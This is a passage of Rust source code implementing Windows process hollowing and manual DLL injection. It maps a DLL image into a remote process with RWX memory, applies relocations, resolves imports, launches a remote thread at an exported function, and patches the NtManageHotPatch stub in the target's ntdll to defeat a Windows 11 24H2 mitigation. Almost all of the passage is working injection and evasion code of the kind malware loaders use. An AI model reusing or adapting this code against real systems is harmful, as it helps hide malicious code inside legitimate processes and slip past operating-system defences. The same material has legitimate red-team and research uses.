    /// - dll_base: base address where DLL is mapped in remote process
    /// - export_name: name of the exported function to call
    pub unsafe fn call_export_in_hollowed_process(
        process_handle: HANDLE,
        dll_data: &[u8],
        dll_base: usize,
        export_name: &str,
    ) -> anyhow::Result<(), anyhow::Error> {
        // Get the RVA of the export
        let export_rva = Self::get_export_rva(dll_data, export_name)?;
        log::info!("export_rva: {export_rva}");
        let remote_addr = dll_base + export_rva as usize;
        log::info!("remote_addr: {remote_addr}");

        // Print process handle value for diagnostics
        log::info!("[diagnostic] process_handle: 0x{:X}", process_handle.0 as usize);

        // Print integrity level of the target process
        match Self::get_process_integrity_level(process_handle) {
            Ok(level) => log::info!("[diagnostic] target process integrity level: {level:?}"),
            Err(e) => log::info!("[diagnostic] failed to get integrity level: {e}"),
        }

        // Check memory protection at remote_addr in the remote process
        use windows::Win32::System::Memory::VirtualQueryEx;
        use windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION;
        let mut mbi = std::mem::MaybeUninit::<MEMORY_BASIC_INFORMATION>::zeroed();
        let mbi_size = std::mem::size_of::<MEMORY_BASIC_INFORMATION>();
        let vq_res = unsafe {
            VirtualQueryEx(
                process_handle,
                Some(remote_addr as *const _),
                mbi.as_mut_ptr(),
                mbi_size,
            )
        };
        if vq_res == 0 {
            log::info!("VirtualQueryEx failed for remote_addr: 0x{:X}", remote_addr);
        } else {
            let mbi = unsafe { mbi.assume_init() };
            log::info!("VirtualQueryEx: BaseAddress=0x{:X}, RegionSize=0x{:X}, State=0x{:X}, Protect=0x{:X}, Type=0x{:X}",
                mbi.BaseAddress as usize, mbi.RegionSize, mbi.State.0, mbi.Protect.0, mbi.Type.0);
        }

        // Resume the main thread if you have it (required for hollowed process)
        // This function now expects the caller to resume the thread before calling this export
        // If you have the main thread handle, resume it here
        // (If not, document that the caller must resume the thread before calling this function)

        // Print a warning if the process might still be suspended
        // (You may want to pass/process_info.hThread here for full automation)

        // EXTREMELY VERBOSE LOGGING for CreateRemoteThread
        log::info!("[VERBOSE] About to call CreateRemoteThread:");
        log::info!("  process_handle: 0x{:X}", process_handle.0 as usize);
        log::info!("  remote_addr (export): 0x{:X}", remote_addr);
        log::info!("  remote_addr as fn ptr: {:?}", unsafe {std::mem::transmute::<usize, *const ()>(remote_addr)});
        log::info!("  Parameters: lpThreadAttributes=None, dwStackSize=0, lpParameter=None, dwCreationFlags=0, lpThreadId=None");
        // Check process handle rights
        use windows::Win32::System::Threading::GetProcessId;
        let pid = unsafe { GetProcessId(process_handle) };
        log::info!("  Target PID: {}", pid);
        // Try to create the remote thread
        let thread_handle = unsafe {
            CreateRemoteThread(
                process_handle,
                None,
                0,
                Some(std::mem::transmute(remote_addr)),
                None,
                0,
                None,
            )
        };

        match thread_handle {
            Ok(handle) => {
                log::info!("[VERBOSE] CreateRemoteThread returned handle: 0x{:X}", handle.0 as usize);
                if handle.is_invalid() {
                    log::info!("[ERROR] CreateRemoteThread returned invalid handle!");
                    return Err(anyhow::anyhow!("CreateRemoteThread failed (invalid handle)"));
                }
                let wait_res = unsafe { WaitForSingleObject(handle, INFINITE) };
                log::info!("[VERBOSE] WaitForSingleObject returned: 0x{:X}", wait_res.0);
                let close_res = unsafe { CloseHandle(handle) };
                log::info!("[VERBOSE] CloseHandle returned: {:?}", close_res);
                Ok(())
            },
            Err(e) => {
                // Print all parameters and error
                log::info!("[ERROR] CreateRemoteThread failed: {e:?}");
                log::info!("[ERROR] Parameters:");
                log::info!("  process_handle: 0x{:X}", process_handle.0 as usize);
                log::info!("  remote_addr: 0x{:X}", remote_addr);
                log::info!("  remote_addr as fn ptr: {:?}", unsafe {std::mem::transmute::<usize, *const ()>(remote_addr)});
                log::info!("  export_name: {}", export_name);
                log::info!("  dll_base: 0x{:X}", dll_base);
                log::info!("  export_rva: 0x{:X}", export_rva);
                log::info!("  Target PID: {}", pid);
                // Try to get last error
                use windows::Win32::Foundation::GetLastError;
                let last_error = unsafe { GetLastError() };
                log::info!("  GetLastError: 0x{:X}", last_error.0);
                Err(anyhow::anyhow!("CreateRemoteThread: {e:?} (remote_addr: 0x{:X}, process_handle: 0x{:X}, GetLastError: 0x{:X})", remote_addr, process_handle.0 as usize, last_error.0))
            }
        }
    }

    
    pub unsafe fn inject_hollowed_process(    
        dll_data: &[u8],
        process_handle: HANDLE,
        function_name: &str,
        _pid: u32
    ) -> anyhow::Result<(), anyhow::Error> {
        unsafe {
            // let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, pid.as_u32())
            // .map_err(|e| format!("OpenProcess failed: {}", e))?;

            // Extract the RVA of the desired export function (e.g., "DllMain")
            let load_rva = Self::get_export_rva(dll_data, function_name)?;

            // Parse preferred base from PE header (supporting PE32 and PE32+)
            let e_lfanew = u32::from_le_bytes(dll_data[0x3C..0x40].try_into().unwrap()) as usize;
            let optional_header = &dll_data[e_lfanew + 0x18..];
            let magic = u16::from_le_bytes(optional_header[0..2].try_into().unwrap());

            let preferred_base = if magic == 0x10B {
                u32::from_le_bytes(optional_header[0x1C..0x20].try_into().unwrap()) as usize
            } else {
                u64::from_le_bytes(optional_header[0x18..0x20].try_into().unwrap()) as usize
            };

            // Allocate memory in the target process at preferred base
            let alloc = VirtualAllocEx(
                process_handle,
                Some(preferred_base as *mut _),
                dll_data.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE,
            );

            if alloc.is_null() {
                return Err(anyhow::anyhow!("VirtualAllocEx failed"));
            }

            // Write DLL headers and sections
            WriteProcessMemory(process_handle, alloc, dll_data.as_ptr() as _, dll_data.len(), None)
                .map_err(|e| anyhow::anyhow!("WriteProcessMemory failed: {}", e))?;

            // Calculate remote entry point address by adding base + RVA
            let entry_point = (alloc as usize).wrapping_add(load_rva as usize);

            // Create remote thread at entry point
            let thread_handle = CreateRemoteThread(
                process_handle,
                None,
                0,
                Some(std::mem::transmute(entry_point)),
                None,
                0,
                None,
            )?;

            if thread_handle.is_invalid() {
                return Err(anyhow::anyhow!("CreateRemoteThread failed"));
            }

            log::info!("Wrote {} bytes to remote process at {:p}", dll_data.len(), alloc);
            let mut verify = vec![0u8; dll_data.len()];
            ReadProcessMemory(process_handle, alloc, verify.as_mut_ptr() as _, dll_data.len(), None)?;
            
            if verify == dll_data {
                log::info!("Remote memory matches injected DLL image");
            } else {
               return Err(anyhow::anyhow!("WARNING: Remote memory does not match!"));
            }
            // let process = OwnedProcess::from_pid(pid).map_err(|e| e.to_string())?;
            // let syringe = Syringe::for_process(process);
            // let injected = syringe.inject(&path).map_err(|e| e.to_string())?;
            // ProcessModule::new_local_unchecked(handle)
            // let remote_proc = syringe
            //     .get_raw_procedure::<extern "system" fn() -> i32>(injected, function)
            //     .map_err(|e| e.to_string())?
            //     .ok_or("Procedure not found")?;

            // Wait until the user clicks OK and the thread exits
            WaitForSingleObject(thread_handle, INFINITE);

            CloseHandle(thread_handle)?;

            Ok(())
        }
    }

    /// Patch NtManageHotPatch syscall stub in remote process for Win11 24H2+ hollowing compatibility
    pub fn patch_nt_manage_hotpatch64(h_process: HANDLE) -> anyhow::Result<(), anyhow::Error> {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
        use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory, FlushInstructionCache};
        use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, PAGE_EXECUTE_READ};
        use windows_strings::PCSTR;
        use std::ffi::c_void;

        // Get local ntdll base and NtManageHotPatch offset
        let ntdll = unsafe { GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr())) }?;
        let ntmanage_addr = unsafe { GetProcAddress(ntdll, PCSTR(b"NtManageHotPatch\0".as_ptr())) };
        let ntmanage_addr = match ntmanage_addr {
            Some(ptr) => ptr as *const c_void,
            None => return Err(anyhow::anyhow!("GetProcAddress(NtManageHotPatch) failed")),
        };
        let offset = (ntmanage_addr as usize) - (ntdll.0 as usize);
        // Get remote ntdll base in target process
        let remote_ntdll = Self::get_remote_module_base_handle(h_process, "ntdll.dll")?;
        if remote_ntdll.is_null() {
            return Err(anyhow::anyhow!("Remote ntdll.dll not found"));
        }
        let remote_patch_addr = (remote_ntdll as usize + offset) as *mut c_void;

        // Prepare patch bytes: mov eax, C00000BB; ret
        let patch: [u8; 6] = [0xB8, 0xBB, 0x00, 0x00, 0xC0, 0xC3];
        let stub_size = 0x20;
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);

        // Change protection to RW
        let vp = unsafe { VirtualProtectEx(h_process, remote_patch_addr, stub_size, PAGE_READWRITE, &mut old_protect) };
        if !vp.is_ok() {
            return Err(anyhow::anyhow!("VirtualProtectEx failed"));
        }
        // Read original stub for validation (optional)
        let mut orig_stub = [0u8; 0x20];
        let mut out_bytes = 0usize;
        let rp = unsafe { ReadProcessMemory(h_process, remote_patch_addr, orig_stub.as_mut_ptr() as *mut c_void, stub_size, Some(&mut out_bytes)) };
        if !rp.is_ok() || out_bytes < 6 {
            return Err(anyhow::anyhow!("ReadProcessMemory failed"));
        }
        // Write patch
        let wp = unsafe { WriteProcessMemory(h_process, remote_patch_addr, patch.as_ptr() as *const c_void, patch.len(), Some(&mut out_bytes)) };
        if !wp.is_ok() || out_bytes != patch.len() {
            return Err(anyhow::anyhow!("WriteProcessMemory failed"));
        }
        // Restore protection
        let vp2 = unsafe { VirtualProtectEx(h_process, remote_patch_addr, stub_size, PAGE_EXECUTE_READ, &mut old_protect) };
        if !vp2.is_ok() {
            return Err(anyhow::anyhow!("VirtualProtectEx restore failed"));
        }
        // Flush instruction cache
        let _ = unsafe { FlushInstructionCache(h_process, Some(remote_patch_addr), patch.len()) };
        Ok(())
    }

}


pub fn apply_relocations(pe_data: &[u8], process_handle: HANDLE, new_base: usize, preferred_base: usize) -> anyhow::Result<()> {
    use goblin::pe::PE;
    let pe = PE::parse(pe_data)?;
    let delta = new_base.wrapping_sub(preferred_base);
    if delta == 0 {
        log::info!("No relocations needed (delta = 0)");
        return Ok(());
    }
    let reloc_dir = pe
        .header
        .optional_header
        .as_ref()
        .and_then(|opt| opt.data_directories.get_base_relocation_table())
        .ok_or_else(|| anyhow::anyhow!("No relocation directory found"))?;
    if reloc_dir.virtual_address == 0 || reloc_dir.size == 0 {
        log::info!("No relocation table found in PE.");
        return Ok(());
    }
    let mut offset = rva_to_offset(pe_data, reloc_dir.virtual_address as usize).unwrap();
    let end = offset + reloc_dir.size as usize;
    let image_size = pe
        .header
        .optional_header
        .map(|opt| opt.windows_fields.size_of_image as usize)
        .unwrap_or(0);
    while offset < end {
        let page_rva = u32::from_le_bytes(pe_data[offset..offset + 4].try_into()?);
        let block_size = u32::from_le_bytes(pe_data[offset + 4..offset + 8].try_into()?);
        if block_size == 0 {
            break;
        }
        let entries_count = (block_size as usize - 8) / 2;
        log::debug!("Reloc block: page_rva=0x{:X}, block_size=0x{:X}, entries={}", page_rva, block_size, entries_count);
        for i in 0..entries_count {
            let entry_offset = offset + 8 + i * 2;
            let entry = u16::from_le_bytes(pe_data[entry_offset..entry_offset + 2].try_into()?);
            let reloc_type = entry >> 12;
            let offset_in_page = entry & 0xFFF;
            let reloc_addr = new_base + page_rva as usize + offset_in_page as usize;
            let in_bounds = reloc_addr >= new_base && reloc_addr + 8 <= new_base + image_size;
            log::debug!(
                "Reloc entry {}: type={}, offset_in_page=0x{:X}, reloc_addr=0x{:X}, in_bounds={}",
                i,
                reloc_type,
                offset_in_page,
                reloc_addr,
                in_bounds
            );
            if !in_bounds {
                log::warn!(
                    "Skipping relocation: address 0x{:X} out of bounds (image base=0x{:X}, size=0x{:X})",
                    reloc_addr,
                    new_base,
                    image_size
                );
                continue;
            }
            match reloc_type {
                3 => {
                    // IMAGE_REL_BASED_HIGHLOW (32-bit)
                    let mut original_value = 0u32;
                    let read_res = unsafe {
                        ReadProcessMemory(
                            process_handle,
                            reloc_addr as *const _,
                            &mut original_value as *mut _ as *mut c_void,
                            4,
                            None,
                        )
                    };
                    log::debug!(
                        "ReadProcessMemory (HIGHLOW): addr=0x{:X}, value=0x{:X}, result={:?}",
                        reloc_addr,
                        original_value,
                        read_res.is_ok()
                    );
                    if let Err(e) = read_res {
                        log::warn!("ReadProcessMemory failed: {:?}", e);
                        return Err(e.into());
                    }
                    let new_value = original_value.wrapping_add(delta as u32);
                    let write_res = unsafe {
                        WriteProcessMemory(
                            process_handle,
                            reloc_addr as *mut _,
                            &new_value as *const _ as *const c_void,
                            4,
                            None,
                        )
                    };
                    log::debug!(
                        "WriteProcessMemory (HIGHLOW): addr=0x{:X}, new_value=0x{:X}, result={:?}",
                        reloc_addr,
                        new_value,
                        write_res.is_ok()
                    );
                    if let Err(e) = write_res {
                        log::warn!("WriteProcessMemory failed: {:?}", e);
                        return Err(e.into());
                    }
                }
                10 => {
                    // IMAGE_REL_BASED_DIR64 (64-bit)
                    let mut original_value = 0u64;
                    let read_res = unsafe {
                        ReadProcessMemory(
                            process_handle,
                            reloc_addr as *const _,
                            &mut original_value as *mut _ as *mut c_void,
                            8,
                            None,
                        )
                    };
                    log::debug!(
                        "ReadProcessMemory (DIR64): addr=0x{:X}, value=0x{:X}, result={:?}",
                        reloc_addr,
                        original_value,
                        read_res.is_ok()
                    );
                    if let Err(e) = read_res {
                        log::warn!("ReadProcessMemory failed: {:?}", e);
                        return Err(e.into());
                    }
                    let new_value = original_value.wrapping_add(delta as u64);
                    let write_res = unsafe {
                        WriteProcessMemory(
                            process_handle,
                            reloc_addr as *mut _,
                            &new_value as *const _ as *const c_void,
                            8,
                            None,
                        )
                    };
                    log::debug!(
                        "WriteProcessMemory (DIR64): addr=0x{:X}, new_value=0x{:X}, result={:?}",
                        reloc_addr,
                        new_value,
                        write_res.is_ok()
                    );
                    if let Err(e) = write_res {
                        log::warn!("WriteProcessMemory failed: {:?}", e);
                        return Err(e.into());
                    }
                }
                0 => {} // IMAGE_REL_BASED_ABSOLUTE (skip)
                _ => log::warn!("Unhandled relocation type: {}", reloc_type),
            }
        }
        offset += block_size as usize;
    }
    log::info!("Relocations applied successfully.");
    Ok(())
}

pub fn resolve_imports(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
    use goblin::pe::PE;
    let pe = PE::parse(dll_data)?;
    let image_size = pe
        .header
        .optional_header
        .map(|opt| opt.windows_fields.size_of_image as usize)
        .unwrap_or(0);
    for import in &pe.imports {
        let dll_name = import.dll;
        log::debug!("Loading DLL: {}", dll_name);
        let h_module = unsafe {
            let dll_name_cstr = format!("{}\0", dll_name);
            let h_module = GetModuleHandleA(PCSTR(dll_name_cstr.as_ptr()));
            if h_module.is_ok() {
                h_module
            } else {
                log::debug!("DLL {} not loaded, attempting to load", dll_name);
                LoadLibraryA(PCSTR(dll_name_cstr.as_ptr()))
            }
        };
        let h_module = match h_module {
            Ok(module) => module,
            Err(e) => {
                log::error!("Failed to load DLL {}: {:?}", dll_name, e);
                return Err(anyhow::anyhow!("Failed to load DLL {}: {:?}", dll_name, e));
            }
        };
        let iat_addr = (base_addr as usize + import.rva as usize) as *mut u64;
        // Verify IAT address is within image bounds
        if iat_addr as usize >= base_addr as usize && iat_addr as usize + 8 <= (base_addr as usize + image_size) {
            let func_addr = unsafe {
                if !import.name.is_empty() {
                    let func_name = format!("{}\0", import.name);
                    log::debug!("Resolving function {} from {}", import.name, dll_name);
                    let result = GetProcAddress(h_module, PCSTR(func_name.as_ptr()));
                    if result.is_none() {
                        let err = GetLastError();
                        log::warn!("Failed to resolve function {} from {}: {:?}", import.name, dll_name, err);
                    }
                    result
                } else {
                    log::debug!("Resolving ordinal {} from {}", import.ordinal, dll_name);
                    let result = GetProcAddress(h_module, PCSTR(import.ordinal as usize as *const u8));
                    if result.is_none() {
                        let err = GetLastError();
                        log::warn!("Failed to resolve ordinal {} from {}: {:?}", import.ordinal, dll_name, err);
                    }
                    result
                }
            };
            if let Some(addr) = func_addr {
                log::debug!("Resolved function at 0x{:X} for IAT 0x{:X}", addr as usize, iat_addr as usize);
                let write_result = unsafe {
                    WriteProcessMemory(
                        process_handle,
                        iat_addr as *mut c_void,
                        &(addr as u64) as *const _ as *const c_void,
                        8,
                        None,
                    )
                };
                if let Err(e) = write_result {
                    log::error!("Failed to write IAT entry at 0x{:X}: {:?}", iat_addr as usize, e);
                    return Err(anyhow::anyhow!("Failed to write IAT entry at 0x{:X}: {:?}", iat_addr as usize, e));
                }
            } else {
                log::warn!(
                    "Failed to resolve function {} (ordinal: {}) from {}, writing 0 to IAT",
                    import.name,
                    import.ordinal,
                    dll_name
                );
                let write_result = unsafe {
                    WriteProcessMemory(
                        process_handle,
                        iat_addr as *mut c_void,
                        &0u64 as *const _ as *const c_void,
                        8,
                        None,
                    )
                };
                if let Err(e) = write_result {
                    log::error!("Failed to write zero to IAT entry at 0x{:X}: {:?}", iat_addr as usize, e);
                    return Err(anyhow::anyhow!("Failed to write zero to IAT entry at 0x{:X}: {:?}", iat_addr as usize, e));
                }
            }
        } else {
            log::warn!(
                "Skipping IAT write: address 0x{:X} out of bounds (image base=0x{:X}, size=0x{:X})",
                iat_addr as usize,
                base_addr as usize,
                image_size
            );
        }
    }
    log::info!("Imports Win32: {}", unsafe { GetLastError().to_hresult().message() });
    log::info!("Imports resolved successfully.");
    Ok(())
}

pub fn patch_nt_manage_hotpatch64(h_process: HANDLE) -> anyhow::Result<(), anyhow::Error> {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory, FlushInstructionCache};
    use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_PROTECTION_FLAGS, PAGE_READWRITE, PAGE_EXECUTE_READ};
    use windows::Win32::System::Threading::GetProcessId;
    use windows::Wdk::System::Threading::{NtQueryInformationProcess, PROCESSINFOCLASS};
    use std::ffi::c_void;

    // Get local ntdll base and NtManageHotPatch offset
    let ntdll = unsafe { GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr())) }?;
    let ntmanage_addr = unsafe { GetProcAddress(ntdll, PCSTR(b"NtManageHotPatch\0".as_ptr())) };
    let ntmanage_addr = match ntmanage_addr {
        Some(ptr) => ptr as *const c_void,
        None => return Err(anyhow::anyhow!("GetProcAddress(NtManageHotPatch) failed")),
    };
    let offset = (ntmanage_addr as usize) - (ntdll.0 as usize);
    log::debug!("Local NtManageHotPatch offset: 0x{:X}", offset);

    // Get target PID
    let pid = unsafe { GetProcessId(h_process) };
    log::debug!("Target process PID: {}", pid);

    // Use NtQueryInformationProcess to get module information
    #[repr(C)]
    struct MODULE_INFORMATION {
        base_of_dll: *mut c_void,
        size_of_image: u32,
        entry_point: *mut c_void,
    }
    #[repr(C)]
    struct PROCESS_MODULE_INFORMATION {
        number_of_modules: u32,
        modules: [MODULE_INFORMATION; 1],
    }

    let mut module_info = vec![0u8; 1024 * std::mem::size_of::<MODULE_INFORMATION>()];
    let mut return_length = 0u32;
    let status = unsafe {
        NtQueryInformationProcess(
            h_process,
            PROCESSINFOCLASS(11), // ProcessModuleInformation
            module_info.as_mut_ptr() as *mut c_void,
            module_info.len() as u32,
            &mut return_length,
        )
    };
    if !status.is_ok() {
        return Err(anyhow::anyhow!("NtQueryInformationProcess (ProcessModuleInformation) failed: {:?}", status));
    }

    let module_info = unsafe { &*(module_info.as_ptr() as *const PROCESS_MODULE_INFORMATION) };
    let mut remote_ntdll: *mut c_void = std::ptr::null_mut();
    for i in 0..module_info.number_of_modules as usize {
        let module = &module_info.modules[i];
        let mut module_name_buf = [0u8; 256];
        let len = unsafe {
            GetModuleBaseNameA(
                h_process,
                Some(HMODULE(module.base_of_dll)),
                &mut module_name_buf,
            )
        };
        if len > 0 {
            let module_name = String::from_utf8_lossy(&module_name_buf[..len as usize]).to_lowercase();
            log::debug!("Found module: {} at 0x{:X}", module_name, module.base_of_dll as usize);
            if module_name.contains("ntdll.dll") {
                remote_ntdll = module.base_of_dll;
                break;
            }
        }
    }

    if remote_ntdll.is_null() {
        return Err(anyhow::anyhow!("Remote ntdll.dll not found"));
    }
    let remote_patch_addr = (remote_ntdll as usize + offset) as *mut c_void;
    log::debug!("Remote NtManageHotPatch address: 0x{:X}", remote_patch_addr as usize);

    // Prepare patch bytes: mov eax, C00000BB (STATUS_NOT_SUPPORTED); ret
    let patch: [u8; 6] = [0xB8, 0xBB, 0x00, 0x00, 0xC0, 0xC3];
    let stub_size = 0x20;
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);

    // Change protection to RW
    let vp = unsafe { VirtualProtectEx(h_process, remote_patch_addr, stub_size, PAGE_READWRITE, &mut old_protect) };
    if !vp.is_ok() {
        return Err(anyhow::anyhow!("VirtualProtectEx failed: {:?}", vp));
    }

    // Read original stub for validation
    let mut orig_stub = [0u8; 0x20];
    let mut out_bytes = 0usize;
    let rp = unsafe { ReadProcessMemory(h_process, remote_patch_addr, orig_stub.as_mut_ptr() as *mut c_void, stub_size, Some(&mut out_bytes)) };
    if !rp.is_ok() || out_bytes < 6 {
        return Err(anyhow::anyhow!("ReadProcessMemory failed: {:?}", rp));
    }

    // Write patch
    let wp = unsafe { WriteProcessMemory(h_process, remote_patch_addr, patch.as_ptr() as *const c_void, patch.len(), Some(&mut out_bytes)) };
    if !wp.is_ok() || out_bytes != patch.len() {
        return Err(anyhow::anyhow!("WriteProcessMemory failed: {:?}", wp));
    }

    // Restore protection
    let vp2 = unsafe { VirtualProtectEx(h_process, remote_patch_addr, stub_size, PAGE_EXECUTE_READ, &mut old_protect) };
    if !vp2.is_ok() {
        return Err(anyhow::anyhow!("VirtualProtectEx restore failed: {:?}", vp2));
    }

    // Flush instruction cache
    unsafe { FlushInstructionCache(h_process, Some(remote_patch_addr), patch.len())? };
    log::debug!("NtManageHotPatch patched at 0x{:X}", remote_patch_addr as usize);
    Ok(())
}
/// Helper function to convert RVA to file offset
pub fn rva_to_offset(pe_data: &[u8], rva: usize) -> Option<usize> {
    let pe = goblin::pe::PE::parse(pe_data).ok()?;
    for section in pe.sections {
        let section_start = section.virtual_address as usize;
        let section_end = section_start + section.size_of_raw_data as usize;
        if rva >= section_start && rva < section_end {
            return Some((rva - section_start) + section.pointer_to_raw_data as usize);
        }
    }
    None
}